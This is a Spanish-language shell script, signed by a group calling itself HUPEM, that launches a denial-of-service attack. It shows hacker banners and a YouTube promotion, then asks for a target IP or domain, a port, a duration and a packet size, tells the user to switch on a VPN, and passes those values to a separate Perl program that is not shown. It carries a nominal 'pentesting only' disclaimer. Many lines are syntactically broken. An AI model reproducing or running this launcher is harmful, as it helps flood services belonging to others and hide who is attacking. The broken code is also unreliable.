#!/# ! / usr / bin / env perl
#Codificado Por DroidZnet 11/07/2018

clear

#BANNER

setterm -foreground white
  echo "    -¨* Herramienta de ataque de denegación de servicio (HUPEM-DDoS) * "
  echo "               -* SO> Android & Linux: para Termux Y Kali Linux * "
  echo "                  -* Codificado Por DroidZnet * "
setterm -foreground green
 				
			echo "	  HUPEM DroidZnet "
     echo "         X HUPEM Hacking Lord "
       echo "     Adm -xd HackFox HUPEM X
	echo   "     DroidZnet RedX Hacking Lor "           
     echo "		D  DroidZnet Warerd Crack R "
		echo    Rick James Lord DarkPeace R "
	echo "  	DroidZ   Net R HUPE   Admin
	echo "	    Sebast   ian HUPEM    Admin "
	echo "	    xdDroidZnet Mr.Gera RX RedX "
	echo "		RedX Sebastian Almuna RedX "
	echo "		  tHUPEM DroidZnet RedX R "
	echo "  	    Hupem  Admin Droid X
	echo "		     Znet  RedX   LordX "
	echo "   		 Droid Znet   HUPEM "
	echo "			 MRedx  RXs   RedX "
	echo "			 Droid Znet  HUPEM "

      	   
setterm -foreground blue
         echo "        * Canal De Youtube *"
  echo "   * www.youtube.com/AndroidVPN *"
  echo "          * fb.me/AndroidVPNYT *"
  sleep 2
  echo
setterm -foreground red
  echo "         *** ADVERTENCIA ****"
setterm -foreground white
  echo "Esta herramienta fue creada para pentesting y pruebas de seguridad informática.
  Si la ley es violada con su uso,
esto sería responsabilidad del usuario que lo manejó"
  echo
setterm -foreground red
  echo "     * Úselo bajo su propio riesgo *
  echo
  sleep 2
setterm -foreground white
  echo
  echo "Establecer el objetivo de IP o DNS >>  \c"
  read Target
  echo
  echo "Configura tu puerto >>  \c"
  read Lport
  echo
  echo "Establecer un paquete de envío en segundos (0 = ilimitado) >>  \c"
  read Time
  echo
  echo "Establecer un tamaño del paquete para enviar (0 = defecto) >>  \c"
  read Size
  echo
setterm -foreground red
  sleep 1
  echo "*w* No olvides activar tu VPN"
  echo
setterm -foreground white
         echo "** Presione ENTER para comenzar o Ctrl + c para cerrar "
         leer ENTER**

#Banner

clear
setterm -foreground blue
			echo "	  HUPEM DroidZnet "
     echo "         X HUPEM Hacking Lord "
       echo "     Adm -xd HackFox HUPEM X
	echo   "     DroidZnet RedX Hacking Lor "           
     echo "		D  DroidZnet Warerd Crack R "
		echo    Rick James Lord DarkPeace R "
	echo "  	DroidZ   Net R HUPE   Admin
	echo "	    Sebast   ian HUPEM    Admin "
	echo "	    xdDroidZnet Mr.Gera RX RedX "
	echo "		RedX Sebastian Almuna RedX "
	echo "		  tHUPEM DroidZnet RedX R "
	echo "  	    Hupem  Admin Droid X
	echo "		     Znet  RedX   LordX "
	echo "   		 Droid Znet   HUPEM "
	echo "			 MRedx  RXs   RedX "
	echo "			 Droid Znet  HUPEM "

setterm -foreground white --bold off
sleep 1
setterm -foreground green
echo "[+] Iniciar un ataque de denegación de servicio a $ Target"
setterm -foreground white
sleep 3
echo

perl DroidZnet $Target $Lport $Time $Size
